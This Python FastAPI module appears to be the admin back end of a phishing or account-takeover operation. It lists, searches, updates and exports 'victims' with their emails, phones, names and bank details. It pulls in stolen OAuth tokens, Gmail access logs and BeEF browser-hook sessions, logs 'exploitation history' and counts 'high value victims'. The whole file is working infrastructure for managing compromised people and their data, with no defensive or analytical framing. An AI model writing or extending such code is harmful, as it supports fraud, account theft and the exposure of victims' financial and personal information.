"""
Victim Management API
Admin interface for victim database management
"""

import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any
from fastapi import APIRouter, HTTPException, status, Depends, Query, Request
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
import json
import csv
import io

from database.mongodb.victims import VictimModel
from database.mongodb.oauth_tokens import OAuthTokenModel
from database.mongodb.gmail_access_logs import GmailAccessLogModel
from database.mongodb.beef_sessions import BeEFSessionModel
from middleware.authentication import get_current_admin_user

logger = logging.getLogger(__name__)

router = APIRouter()

# Pydantic models
class VictimUpdateRequest(BaseModel):
    status: Optional[str] = None
    risk_score: Optional[int] = None
    verification_status: Optional[str] = None
    behavior_pattern: Optional[str] = None
    business_indicators: Optional[Dict[str, Any]] = None
    risk_assessment: Optional[Dict[str, Any]] = None

class VictimSearchRequest(BaseModel):
    query: str
    search_fields: List[str] = ["email", "personal_info.full_name", "phone"]
    filters: Optional[Dict[str, Any]] = None
    sort_by: str = "created_at"
    sort_order: str = "desc"
    page: int = 1
    limit: int = 50

class VictimExportRequest(BaseModel):
    victim_ids: Optional[List[str]] = None
    filters: Optional[Dict[str, Any]] = None
    format: str = "json"  # json, csv, xlsx
    include_sensitive_data: bool = False

@router.get("/")
async def list_victims(
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=100),
    sort_by: str = Query("created_at"),
    sort_order: str = Query("desc", regex="^(asc|desc)$"),
    status: Optional[str] = Query(None),
    risk_level: Optional[str] = Query(None),
    verification_status: Optional[str] = Query(None),
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get paginated list of victims with filtering"""
    try:
        victim_model = VictimModel()
        
        # Build filters
        filters = {}
        if status:
            filters["status"] = status
        if risk_level:
            filters["risk_assessment.overall_risk_level"] = risk_level
        if verification_status:
            filters["verification_status"] = verification_status
        
        # Get victims
        victims = await victim_model.get_victims_paginated(
            page=page,
            limit=limit,
            sort_by=sort_by,
            sort_order=sort_order,
            filters=filters
        )
        
        # Get total count
        total_count = await victim_model.count_victims(filters)
        
        return {
            "success": True,
            "victims": victims,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total_count,
                "pages": (total_count + limit - 1) // limit
            }
        }
        
    except Exception as e:
        logger.error(f"Error listing victims: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to list victims"
        )

@router.get("/{victim_id}")
async def get_victim_details(
    victim_id: str,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get detailed information about a specific victim"""
    try:
        victim_model = VictimModel()
        oauth_model = OAuthTokenModel()
        gmail_model = GmailAccessLogModel()
        beef_model = BeEFSessionModel()
        
        # Get victim data
        victim = await victim_model.get_victim_by_id(victim_id)
        if not victim:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Victim not found"
            )
        
        # Get related data
        oauth_tokens = await oauth_model.get_tokens_by_victim_id(victim_id)
        gmail_access_logs = await gmail_model.get_access_logs_by_victim_id(victim_id)
        beef_sessions = await beef_model.get_sessions_by_victim_id(victim_id)
        
        return {
            "success": True,
            "victim": victim,
            "oauth_tokens": oauth_tokens,
            "gmail_access_logs": gmail_access_logs,
            "beef_sessions": beef_sessions
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting victim details: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get victim details"
        )

@router.put("/{victim_id}")
async def update_victim(
    victim_id: str,
    request: VictimUpdateRequest,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Update victim information"""
    try:
        victim_model = VictimModel()
        
        # Check if victim exists
        victim = await victim_model.get_victim_by_id(victim_id)
        if not victim:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Victim not found"
            )
        
        # Prepare update data
        update_data = {}
        if request.status is not None:
            update_data["status"] = request.status
        if request.risk_score is not None:
            update_data["risk_score"] = request.risk_score
        if request.verification_status is not None:
            update_data["verification_status"] = request.verification_status
        if request.behavior_pattern is not None:
            update_data["behavior_pattern"] = request.behavior_pattern
        if request.business_indicators is not None:
            update_data["business_indicators"] = request.business_indicators
        if request.risk_assessment is not None:
            update_data["risk_assessment"] = request.risk_assessment
        
        update_data["updated_at"] = datetime.now(timezone.utc)
        
        # Update victim
        success = await victim_model.update_victim(victim_id, update_data)
        
        if success:
            return {
                "success": True,
                "message": "Victim updated successfully"
            }
        else:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to update victim"
            )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error updating victim: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to update victim"
        )

@router.delete("/{victim_id}")
async def delete_victim(
    victim_id: str,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Soft delete a victim"""
    try:
        victim_model = VictimModel()
        
        # Check if victim exists
        victim = await victim_model.get_victim_by_id(victim_id)
        if not victim:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Victim not found"
            )
        
        # Soft delete victim
        success = await victim_model.soft_delete_victim(victim_id)
        
        if success:
            return {
                "success": True,
                "message": "Victim deleted successfully"
            }
        else:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to delete victim"
            )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error deleting victim: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to delete victim"
        )

@router.post("/search")
async def search_victims(
    request: VictimSearchRequest,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Search victims with advanced filtering"""
    try:
        victim_model = VictimModel()
        
        # Perform search
        results = await victim_model.search_victims(
            query=request.query,
            search_fields=request.search_fields,
            filters=request.filters,
            sort_by=request.sort_by,
            sort_order=request.sort_order,
            page=request.page,
            limit=request.limit
        )
        
        return {
            "success": True,
            "results": results["victims"],
            "pagination": results["pagination"],
            "search_info": {
                "query": request.query,
                "search_fields": request.search_fields,
                "total_found": results["pagination"]["total"]
            }
        }
        
    except Exception as e:
        logger.error(f"Error searching victims: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to search victims"
        )

@router.post("/export")
async def export_victims(
    request: VictimExportRequest,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Export victims data in various formats"""
    try:
        victim_model = VictimModel()
        
        # Get victims data
        if request.victim_ids:
            victims = []
            for victim_id in request.victim_ids:
                victim = await victim_model.get_victim_by_id(victim_id)
                if victim:
                    victims.append(victim)
        else:
            victims = await victim_model.get_victims_with_filters(request.filters)
        
        if request.format == "json":
            return export_as_json(victims, request.include_sensitive_data)
        elif request.format == "csv":
            return export_as_csv(victims, request.include_sensitive_data)
        else:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Unsupported export format"
            )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error exporting victims: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to export victims"
        )

def export_as_json(victims: List[Dict[str, Any]], include_sensitive: bool) -> StreamingResponse:
    """Export victims as JSON"""
    # Filter sensitive data if not requested
    export_data = []
    for victim in victims:
        if not include_sensitive:
            # Remove sensitive fields
            victim_copy = victim.copy()
            if "bank_info" in victim_copy:
                victim_copy["bank_info"] = {"account_number": "***", "account_holder": "***"}
            export_data.append(victim_copy)
        else:
            export_data.append(victim)
    
    json_str = json.dumps(export_data, indent=2, default=str)
    
    return StreamingResponse(
        io.BytesIO(json_str.encode()),
        media_type="application/json",
        headers={"Content-Disposition": "attachment; filename=victims_export.json"}
    )

def export_as_csv(victims: List[Dict[str, Any]], include_sensitive: bool) -> StreamingResponse:
    """Export victims as CSV"""
    output = io.StringIO()
    
    # Define CSV fields
    fields = [
        "victim_id", "email", "phone", "full_name", "status", "risk_score",
        "verification_status", "behavior_pattern", "created_at", "last_activity"
    ]
    
    if include_sensitive:
        fields.extend(["bank_name", "account_number", "account_holder"])
    
    writer = csv.DictWriter(output, fieldnames=fields)
    writer.writeheader()
    
    for victim in victims:
        row = {
            "victim_id": victim.get("victim_id", ""),
            "email": victim.get("email", ""),
            "phone": victim.get("phone", ""),
            "full_name": victim.get("personal_info", {}).get("full_name", ""),
            "status": victim.get("status", ""),
            "risk_score": victim.get("risk_score", 0),
            "verification_status": victim.get("verification_status", ""),
            "behavior_pattern": victim.get("behavior_pattern", ""),
            "created_at": victim.get("created_at", ""),
            "last_activity": victim.get("last_activity", "")
        }
        
        if include_sensitive:
            bank_info = victim.get("bank_info", {})
            row.update({
                "bank_name": bank_info.get("bank_name", ""),
                "account_number": bank_info.get("account_number", ""),
                "account_holder": bank_info.get("account_holder", "")
            })
        
        writer.writerow(row)
    
    csv_content = output.getvalue()
    output.close()
    
    return StreamingResponse(
        io.BytesIO(csv_content.encode()),
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=victims_export.csv"}
    )

@router.get("/{victim_id}/exploitation-history")
async def get_victim_exploitation_history(
    victim_id: str,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get exploitation history for a specific victim"""
    try:
        victim_model = VictimModel()
        gmail_model = GmailAccessLogModel()
        beef_model = BeEFSessionModel()
        
        # Check if victim exists
        victim = await victim_model.get_victim_by_id(victim_id)
        if not victim:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Victim not found"
            )
        
        # Get exploitation history
        exploitation_history = victim.get("exploitation_history", [])
        gmail_access_logs = await gmail_model.get_access_logs_by_victim_id(victim_id)
        beef_sessions = await beef_model.get_sessions_by_victim_id(victim_id)
        
        return {
            "success": True,
            "victim_id": victim_id,
            "exploitation_history": exploitation_history,
            "gmail_access_logs": gmail_access_logs,
            "beef_sessions": beef_sessions
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting exploitation history: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get exploitation history"
        )

@router.post("/{victim_id}/add-exploitation-record")
async def add_exploitation_record(
    victim_id: str,
    exploitation_data: Dict[str, Any],
    current_admin: dict = Depends(get_current_admin_user)
):
    """Add exploitation record to victim history"""
    try:
        victim_model = VictimModel()
        
        # Check if victim exists
        victim = await victim_model.get_victim_by_id(victim_id)
        if not victim:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Victim not found"
            )
        
        # Add exploitation record
        success = await victim_model.add_exploitation_record(victim_id, exploitation_data)
        
        if success:
            return {
                "success": True,
                "message": "Exploitation record added successfully"
            }
        else:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to add exploitation record"
            )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error adding exploitation record: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to add exploitation record"
        )

@router.get("/statistics/summary")
async def get_victim_statistics_summary(
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get victim statistics summary"""
    try:
        victim_model = VictimModel()
        
        # Get various statistics
        total_victims = await victim_model.count_total_victims()
        active_victims = await victim_model.count_active_victims()
        high_value_victims = await victim_model.count_high_value_victims()
        verified_victims = await victim_model.count_verified_victims()
        
        # Get geographic distribution
        geographic_distribution = await victim_model.get_geographic_distribution()
        
        # Get risk distribution
        risk_distribution = await victim_model.get_risk_distribution()
        
        # Get recent activity
        new_victims_today = await victim_model.count_victims_since(days=1)
        new_victims_this_week = await victim_model.count_victims_since(days=7)
        new_victims_this_month = await victim_model.count_victims_since(days=30)
        
        return {
            "success": True,
            "statistics": {
                "total_victims": total_victims,
                "active_victims": active_victims,
                "high_value_victims": high_value_victims,
                "verified_victims": verified_victims,
                "geographic_distribution": geographic_distribution,
                "risk_distribution": risk_distribution,
                "recent_activity": {
                    "new_today": new_victims_today,
                    "new_this_week": new_victims_this_week,
                    "new_this_month": new_victims_this_month
                }
            }
        }
        
    except Exception as e:
        logger.error(f"Error getting victim statistics: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get victim statistics"
        )